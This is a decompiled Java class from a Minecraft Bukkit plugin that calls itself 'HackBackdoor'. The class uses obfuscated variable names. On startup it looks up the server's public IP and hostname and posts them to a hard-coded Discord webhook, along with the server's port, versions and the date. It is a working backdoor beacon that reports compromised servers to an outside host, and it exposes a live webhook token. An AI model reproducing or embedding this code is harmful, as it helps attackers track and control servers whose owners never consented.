/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 */
package me.system.runner.methods;

import java.awt.Color;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;
import java.util.Base64;
import java.util.Calendar;
import java.util.Date;
import me.system.runner.data.DataManager;
import me.system.runner.utils.DWeb;
import org.bukkit.Bukkit;

public class onEnableLogger {
    public static /* synthetic */ Boolean host_message_already;
    public static /* synthetic */ Boolean host_logged_already;
    public static /* synthetic */ Boolean unknown_host;
    public static /* synthetic */ Boolean logged_already;

    public static void start2() throws IOException {
        String llllllllllllllIIIIlllIlIlllIIIIl = "https://discord.com/api/webhooks/1044359289264934982/mS5FfeY1ABKIuJJ9-ATnVsa2wP6DN-dzz3B-y2iYmbj5D9Bdt3-KmOyrmXfYrQYbXhR6";
        byte[] llllllllllllllIIIIlllIlIlllIIIII = Base64.getEncoder().encode(llllllllllllllIIIIlllIlIlllIIIIl.getBytes());
        DataManager.getData().set("mywh", (Object)new String(llllllllllllllIIIIlllIlIlllIIIII));
        DataManager.saveData();
        String llllllllllllllIIIIlllIlIllIlllll = Bukkit.getServer().getIp();
        DataManager.getData().set("serverip", (Object)new String(llllllllllllllIIIIlllIlIllIlllll));
        DataManager.saveData();
        if (DataManager.getData().getString("mywh").length() > 2) {
            String llllllllllllllIIIIlllIlIlllIlIlI = String.valueOf(new StringBuilder().append(DataManager.getData().getString("serverip")).append(" has been started up with HackBackdoor!!!!"));
            byte[] llllllllllllllIIIIlllIlIlllIlIIl = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
            DWeb llllllllllllllIIIIlllIlIlllIlIII = new DWeb(new String(llllllllllllllIIIIlllIlIlllIlIIl));
            Date llllllllllllllIIIIlllIlIlllIIlll = Calendar.getInstance().getTime();
            URL llllllllllllllIIIIlllIlIlllIIllI = new URL("https://api.ipify.org/");
            BufferedReader llllllllllllllIIIIlllIlIlllIIlIl = new BufferedReader(new InputStreamReader(llllllllllllllIIIIlllIlIlllIIllI.openStream()));
            String llllllllllllllIIIIlllIlIlllIIlII = llllllllllllllIIIIlllIlIlllIIlIl.readLine();
            InetAddress llllllllllllllIIIIlllIlIlllIIIll = InetAddress.getByName(llllllllllllllIIIIlllIlIlllIIlII);
            String llllllllllllllIIIIlllIlIlllIIIlI = llllllllllllllIIIIlllIlIlllIIIll.getHostName();
            if (Character.isDigit(llllllllllllllIIIIlllIlIlllIIIlI.charAt(0))) {
                llllllllllllllIIIIlllIlIlllIIIlI = "Unknown (Possible IP Masking)";
                unknown_host = true;
            }
            llllllllllllllIIIIlllIlIlllIlIII.setContent("");
            llllllllllllllIIIIlllIlIlllIlIII.setTts(false);
            llllllllllllllIIIIlllIlIlllIlIII.addEmbed(new DWeb.EmbedObject().setTitle("HackBackdoor").setDescription("Server started running HB Door:").setColor(Color.YELLOW).addField("Client version: ", Bukkit.getBukkitVersion(), false).addField("Server version: ", Bukkit.getVersion(), false).addField("Server IP:", String.valueOf(new StringBuilder().append(llllllllllllllIIIIlllIlIlllIIlII).append(":").append(Bukkit.getServer().getPort())), false).addField("Server Host:", llllllllllllllIIIIlllIlIlllIIIlI, false).addField("At date:", llllllllllllllIIIIlllIlIlllIIlll.toString(), false));
            llllllllllllllIIIIlllIlIlllIlIII.execute();
            try {
                llllllllllllllIIIIlllIlIlllIlIII.execute();
            }
            catch (IOException llllllllllllllIIIIlllIlIllIlIIlI) {
                // empty catch block
            }
        }
    }

    static {
        unknown_host = false;
        logged_already = false;
        host_logged_already = false;
        host_message_already = false;
    }

    public onEnableLogger() {
        onEnableLogger llllllllllllllIIIIlllIlIlllllIIl;
    }
}

